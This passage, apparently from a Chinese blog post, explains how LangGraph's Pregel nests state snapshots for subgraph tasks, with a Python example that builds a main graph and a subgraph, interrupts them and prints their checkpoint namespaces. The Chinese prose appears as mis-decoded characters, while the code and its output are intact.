id=\"4çŠ¶æ€åµŒå¥—\">4.çŠ¶æ€åµŒå¥—</h2>\n<p>è¿™é‡Œæˆ‘ä»¬æœ‰å¿…è¦æä¸€ä¸‹PregelTaskç±»çš„<code>state</code>å­—æ®µã€‚ä»ç»™å‡ºçš„å®šä¹‰å¯ä»¥çœ‹å‡ºï¼Œå®ƒå¯ä»¥è¿”å›ä¸€ä¸ªRunnableConfigé…ç½®ï¼Œä¹Ÿå¯ä»¥è¿”å›ä¸€ä¸ªStateSnapshotå¯¹è±¡ã€‚å¦‚æœä»»åŠ¡æ¶‰åŠå­å›¾çš„è°ƒç”¨ï¼Œå¹¶ä¸”åœ¨è°ƒç”¨get_state/aget_stateæ–¹æ³•æ—¶å°†subgraphså‚æ•°è®¾ç½®ä¸ºTrueï¼Œå®ƒçš„stateå­—æ®µå°±ä¼šè¿”å›ä¸€ä¸ªæè¿°å­å›¾å½“å‰çŠ¶æ€çš„<code>StateSnapshot</code>å¯¹è±¡ã€‚å€ŸåŠ©äºåæ˜ æ‰§è¡Œé“¾è·¯å’Œè°ƒç”¨é¡ºåºçš„Checkpointå‘½åç©ºé—´ï¼Œå°±å¯ä»¥å½¢æˆçš„åµŒå¥—å±‚æ¬¡ç»“æ„ï¼ˆstate =&gt;task=&gt;stateï¼‰ä½¿æˆ‘ä»¬å¯ä»¥å¯ä»¥çœ‹åˆ°ä¸€ä¸ªä»»åŠ¡å®Œæ•´çš„è°ƒç”¨é“¾æ¡ã€‚</p>\n<p><img alt=\"Alternative Text\" class=\"lazyload\" /></p>\n<p>ä»¥å¦‚ä¸‹è¿™ä¸ªéªŒè¯ç¨‹åºä¸ºä¾‹ã€‚æˆ‘ä»¬æ„å»ºäº†ä¸¤ä¸ªå…·æœ‰å•ä¸€Nodeçš„Pregelå¯¹è±¡appå’Œsub_graphï¼Œå‰è€…çš„èŠ‚ç‚¹main_nodeä»¥å­å›¾è°ƒç”¨çš„æ–¹å¼è°ƒç”¨sub_graphï¼Œåè€…çš„Nodeå‘½åä¸º â€œsub_nodeâ€ã€‚ä¸ºäº†åœ¨StateSnapshotä¸­å°†ä»»åŠ¡ä¿ç•™ä¸‹æ¥ï¼Œæˆ‘ä»¬åœ¨ä¸¤ä¸ªNodeä¸­å¼•å…¥äº†ä¸­æ–­ã€‚</p>\n<pre><code class=\"language-python\">from langgraph.pregel import Pregel, NodeBuilder\nfrom langgraph.channels import LastValue\nfrom langgraph.checkpoint.memory import InMemorySaver\nfrom langgraph.types import interrupt\nfrom typing import Any\nfrom langgraph.types import StateSnapshot\n\nsub_node = (NodeBuilder()\n    .subscribe_to(\"start\")\n    .do(lambda _: interrupt(\"manual interrupt\"))\n)\nsub_graph = Pregel(\n    nodes={\"sub_node\": sub_node},\n    channels={\"start\": LastValue(str)},\n    input_channels=[\"start\"],\n    output_channels=[],\n)\n\ndef handle(args: dict[str, Any]) -&gt; None:\n    sub_graph.invoke(input={\"start\": \"begin\"})\n    interrupt(\"main graph interrupt\")\n\nmain_node = NodeBuilder().subscribe_to(\"start\").do(handle)\napp = Pregel(\n    nodes={\"main_node\": main_node},\n    channels={\"start\": LastValue(str)},\n    input_channels=[\"start\"],\n    output_channels=[],\n    checkpointer=InMemorySaver())\n\nconfig = {\"configurable\": {\"thread_id\": \"123\"}}\napp.invoke(input={\"start\": \"begin\"}, config=config)\nsnapshot = app.get_state(config, subgraphs=True)\n\nindent = -1\ndef print_snapshot(snapshot: StateSnapshot) -&gt; None:\n    global indent\n    indent += 1\n    config = snapshot.config[\"configurable\"]\n    print(f\"{'  ' * indent}checkpoint_ns: {config.get('checkpoint_ns', None)}\")\n    for task in snapshot.tasks:\n        print(f\"{'  ' * indent}task: {task.name}:{task.id}\")\n        if sub_snapshot := task.state:\n            print_snapshot(sub_snapshot)\n\nprint_snapshot(snapshot)\n</code></pre>\n<p>åœ¨å®Œæˆè°ƒç”¨åï¼Œæˆ‘ä»¬è°ƒç”¨ä½œä¸ºä¸»å›¾çš„Pregelå¯¹è±¡çš„<code>get_state</code>æ–¹æ³•ï¼Œå¹¶å°†å‚æ•°subgraphsè®¾ç½®ä¸ºTrueã€‚æˆ‘ä»¬è°ƒç”¨print_snapshotå‡½æ•°è¾“å‡ºStateSnapshotæä¾›çš„Checkpointå‘½åç©ºé—´å’Œä»»åŠ¡çš„åç§°ä¸IDã€‚å¦‚æœæè¿°ä»»åŠ¡çš„PregelTaskå¯¹è±¡çš„stateå­—æ®µä¹Ÿæ˜¯ä¸€ä¸ªStateSnapshotå¯¹è±¡ï¼Œé‚£ä¹ˆç»§ç»­é€’å½’è°ƒç”¨æ­¤å‡½æ•°ã€‚ä»å¦‚ä¸‹çš„è¾“å‡ºå¯ä»¥çœ‹å‡ºï¼Œä½œä¸ºå­å›¾çš„Pregelå°†å½“å‰ä»»åŠ¡çš„åç§°å’ŒIDçš„ç»„åˆä½œä¸ºCheckpointå‘½åç©ºé—´ï¼Œè¿™æ ·çš„ç»“æ„ç¡®ä¿äº† â€œä¸»å›¾â€ æ¢å¤çš„æ—¶å€™èƒ½å¤Ÿç²¾å‡†åœ°åŠ è½½ â€œå­å›¾â€ çš„çŠ¶æ€ã€‚</p>\n<pre><code>checkpoint_ns: \ntask: main_node:9f7c900b-0d56-927c-17fb-5d519cc85678\n    checkpoint_ns: main_node:9f7c900b-0d56-927c-17fb-5d519cc85678\n    task: sub_node:a483bfb8-bcc6-92b3-2f64-9f9e9f4fe158\n</code></pre>\n\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-02-19 07:58</span>&nbsp;\n<a href=\"https://www.cnblogs.com/jaydenai\">JaydenAI</a>&nbsp;\né˜…è¯»(<span id=\"post_view_count\">30</span>)&nbsp;\nè¯„è®º(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">æ”¶è—</a>&nbsp;\n<a href=\"\">ä¸¾æŠ¥</a>\n</div>"
    }
  ]
}